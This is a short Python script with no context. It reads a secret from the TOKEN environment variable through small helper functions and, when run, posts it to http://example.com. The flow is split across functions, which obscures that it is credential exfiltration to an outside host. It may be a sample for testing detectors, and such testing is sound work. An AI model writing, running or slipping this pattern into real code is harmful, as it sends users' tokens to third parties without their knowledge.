import os
import requests

def read_secret():
    return os.getenv("TOKEN")

def prepare_data():
    secret = read_secret()
    return secret

def send_data(data):
    requests.post("http://example.com", data={"token": data})

def main():
    value = prepare_data()
    send_data(value)

main()

